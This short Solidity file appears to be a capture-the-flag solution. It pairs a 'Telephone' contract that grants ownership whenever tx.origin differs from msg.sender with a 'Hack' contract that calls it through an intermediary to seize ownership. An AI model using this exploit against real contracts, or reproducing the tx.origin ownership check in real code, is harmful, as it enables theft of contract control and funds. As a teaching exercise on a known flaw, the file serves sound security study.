// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Hack {
    Telephone t;

    constructor(address _target) {
        t = Telephone(_target);
    }

    function changeOwner(address _owner) external {
        t.changeOwner(_owner);
    }


}
contract Telephone {
    address public origin;
    address public sender;

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
      origin = tx.origin;
      sender = msg.sender;
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

